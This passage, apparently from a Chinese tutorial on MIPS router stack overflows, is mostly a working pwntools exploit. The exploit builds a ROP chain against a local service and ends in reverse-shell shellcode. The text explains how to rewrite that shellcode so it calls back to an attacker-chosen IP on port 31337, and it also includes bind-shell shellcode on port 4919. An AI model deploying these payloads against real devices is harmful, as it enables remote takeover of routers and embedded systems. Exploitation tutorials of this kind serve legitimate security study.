    #---------------stack 2-------------------    
    payload += 'c' * 0x24
    payload += p32(libc_addr + 0x000214A0)           # s3
    payload += 'd' * 4                               # s4
    payload += p32(libc_addr + 0xAfe0)               # ra
    #---------------stack 3-------------------    payload += 'a' * (0x3c-4*9)
    payload += p32(libc_addr + 0x000214A0)       # s0
    payload += 'a' * 4                               # s1
    payload += 'a' * 4                               # s2
    payload += 'a' * 4                               # s3
    payload += 'a' * 4                               # s4
    payload += 'a' * 4                               # s5
    payload += 'a' * 4                               # s6
    payload += 'a' * 4                               # s7
    payload += 'a' * 4                               # fp
    payload += p32(libc_addr + 0x0001B230)           # ra
    payload += 'f' * 0x28
    payload += shellcode
    r = remote('127.0.0.1',55555)
    r.recvuntil('Send Me Bytes:')
    r.sendline(payload)
    r.interactive()
运行起来，在服务端可以看到，这里确实可以 `getshell`。
###  shellcode 的选择和构造
这里的 `shellcode` 可以选择两种类型， **一种是在本地传一个`shell` 绑定到某个端口，另一种是直接反弹 `shell`。**
这里的 `shellcode` 可以自己开发，也可以直接用网上现成的。自己开发的话比较耗时难度也比较大，这边就直接使用[这里的](http://shell-storm.org/shellcode/)。
####  反弹 shell
先选择一个反弹 `shell` 的 `shellcode`，在下面这个链接中，可以看到这边是将 `shell` 反弹到了 `192.168.1.177`
这个 ip 的 `31337` 端口。
我们使用的话之 **直接更改他的 ip 地址就行了** ，也就是对 `li $a1, 0xB101A8C0 #192.168.1.177`
这条汇编指令进行更改。
如何更改呢？这边就需要用到 `pwntools` 的 `asm` 函数。
首先，我们需要把目的 ip 地址转化为 16 进制，这里就拿笔者本机来演示。这里我本机的 IP 是 `192.168.123.158`
转化成 16 进制为：`0x9e7ba8c0`
那么这里的汇编语句就是：`li $a1,0x9e7ba8c0`
导入 `pwntools.asm` 函数中：
得到相应汇编语句的 `hex` 值，替换掉 `payload` 原来的 `hex` 值就行了。即：
    stg3_SC = "xffxffx04x28xa6x0fx02x24x0cx09x09x01x11x11x04x28"
    stg3_SC += "xa6x0fx02x24x0cx09x09x01xfdxffx0cx24x27x20x80x01"
    stg3_SC += "xa6x0fx02x24x0cx09x09x01xfdxffx0cx24x27x20x80x01"
    stg3_SC += "x27x28x80x01xffxffx06x28x57x10x02x24x0cx09x09x01"
    stg3_SC += "xffxffx44x30xc9x0fx02x24x0cx09x09x01xc9x0fx02x24"
    stg3_SC += "x0cx09x09x01x79x69x05x3cx01xffxa5x34x01x01xa5x20"
    #stg3_SC += "xf8xffxa5xafx01xb1x05x3cxc0xa8xa5x34xfcxffxa5xaf"          # 192.168.1.177
    stg3_SC += "xf8xffxa5xafx7bx9ex05x3cxc0xa8xa5x34xfcxffxa5xaf"           # 192.168.123.158
    stg3_SC += "xf8xffxa5x23xefxffx0cx24x27x30x80x01x4ax10x02x24"
    stg3_SC += "x0cx09x09x01x62x69x08x3cx2fx2fx08x35xecxffxa8xaf"
    stg3_SC += "x73x68x08x3cx6ex2fx08x35xf0xffxa8xafxffxffx07x28"
    stg3_SC += "xf4xffxa7xafxfcxffxa7xafxecxffxa4x23xecxffxa8x23"
    stg3_SC += "xf8xffxa8xafxf8xffxa5x23xecxffxbdx27xffxffx06x28"
    stg3_SC += "xabx0fx02x24x0cx09x09x01"
`nc` 监听 31337 端口，运行 `exp` 成功反弹一个 `shell`：
####  绑定到相应端口
这里的 shellcode 使用这里的：  
也就是开启一个 `bash` 监听本地的 `4919` 端口。
    bind_port_shellcode = "xe0xffxbdx27xfdxffx0ex24x27x20xc0x01x27x28xc0x01xffxffx06x28x57x10x02x24x0cx01x01x01x50x73x0fx24xffxffx50x30xefxffx0ex24x27x70xc0x01x13x37x0dx24x04x68xcdx01xffxfdx0ex24x27x70xc0x01x25x68xaex01xe0xffxadxafxe4xffxa0xafxe8xffxa0xafxecxffxa0xafx25x20x10x02xefxffx0ex24x27x30xc0x01xe0xffxa5x23x49x10x02x24x0cx01x01x01x50x73x0fx24x25x20x10x02x01x01x05x24x4ex10x02x24x0cx01x01x01x50x73x0fx24x25x20x10x02xffxffx05x28xffxffx06x28x48x10x02x24x0cx01x01x01x50x73x0fx24xffxffx50x30x25x20x10x02xfdxffx0fx24x27x28xe0x01xdfx0fx02x24x0cx01x01x01x50x73x0fx24x25x20x10x02x01x01x05x28xdfx0fx02x24x0cx01x01x01x50x73x0fx24x25x20x10x02xffxffx05x28xdfx0fx02x24x0cx01x01x01x50x73x0fx24x50x73x06x24xffxffxd0x04x50x73x0fx24xffxffx06x28xdbxffx0fx24x27x78xe0x01x21x20xefx03xf0xffxa4xafxf4xffxa0xafxf0xffxa5x23xabx0fx02x24x0cx01x01x01/bin/sh"
直接替换原来 `payload`：
但是这里有点问题，执行完 exp 却开启了别的端口，直接连接上去程序会直接崩溃。所以还是使用上面反弹 `shell` 的 exp 吧。
###  exp
    #!/usr/bin/python
    from pwn import *
    context.arch = 'mips'
    context.endian = 'little'
    libc_addr = 0x766e5000
    sleep_offset = 0x0002F2B0
    stg3_SC = ""
    stg3_SC = "xffxffx04x28xa6x0fx02x24x0cx09x09x01x11x11x04x28"
    stg3_SC += "xa6x0fx02x24x0cx09x09x01xfdxffx0cx24x27x20x80x01"
    stg3_SC += "xa6x0fx02x24x0cx09x09x01xfdxffx0cx24x27x20x80x01"
    stg3_SC += "x27x28x80x01xffxffx06x28x57x10x02x24x0cx09x09x01"
    stg3_SC += "xffxffx44x30xc9x0fx02x24x0cx09x09x01xc9x0fx02x24"
    stg3_SC += "x0cx09x09x01x79x69x05x3cx01xffxa5x34x01x01xa5x20"
    stg3_SC += "xf8xffxa5xafx7bx9ex05x3cxc0xa8xa5x34xfcxffxa5xaf"         # 192.168.123.158
    stg3_SC += "xf8xffxa5x23xefxffx0cx24x27x30x80x01x4ax10x02x24"
    stg3_SC += "x0cx09x09x01x62x69x08x3cx2fx2fx08x35xecxffxa8xaf"
    stg3_SC += "x73x68x08x3cx6ex2fx08x35xf0xffxa8xafxffxffx07x28"
    stg3_SC += "xf4xffxa7xafxfcxffxa7xafxecxffxa4x23xecxffxa8x23"
    stg3_SC += "xf8xffxa8xafxf8xffxa5x23xecxffxbdx27xffxffx06x28"
    stg3_SC += "xabx0fx02x24x0cx09x09x01"
    payload = 'a' * 51
    payload += p32(libc_addr + 0xAfe0)    # jr $ra
    payload += 'b' * (0x3c - 4 * 9)
    payload += 'a' * 4                               # s0
    payload += p32(libc_addr + 0x21C34)              # s1
    payload += 'a' * 4                               # s2
    payload += p32(libc_addr + sleep_offset)         # s3
    payload += 'a' * 4                               # s4
    payload += 'a' * 4                               # s5
    payload += 'a' * 4                               # s6
    payload += 'a' * 4                               # s7
    payload += 'a' * 4                               # fp
    payload += p32(libc_addr + 0x2FB10)              # ra
    #---------------stack 2-------------------    
    payload += 'c' * 0x24
    payload += p32(libc_addr + 0x000214A0)           # s3
    payload += 'd' * 4                               # s4
    payload += p32(libc_addr + 0xAfe0)               # ra
    #---------------stack 3-------------------    payload += 'a' * (0x3c-4*9)
    payload += p32(libc_addr + 0x000214A0)       # s0
    payload += 'a' * 4                               # s1
    payload += 'a' * 4                               # s2
    payload += 'a' * 4                               # s3
    payload += 'a' * 4                               # s4
    payload += 'a' * 4                               # s5
    payload += 'a' * 4                               # s6
    payload += 'a' * 4                               # s7
    payload += 'a' * 4                               # fp
    payload += p32(libc_addr + 0x0001B230)           # ra
    payload += 'f' * 0x28
    payload += stg3_SC
    r = remote('127.0.0.1',55555)
    r.recvuntil('Send Me Bytes:')
    r.sendline(payload)
    r.interactive()
## 总结
在实际的路由器栈溢出时，如果执行 `execve` 函数没办法 `getshell` 时，可以试试上面反弹 `shell` 的方式。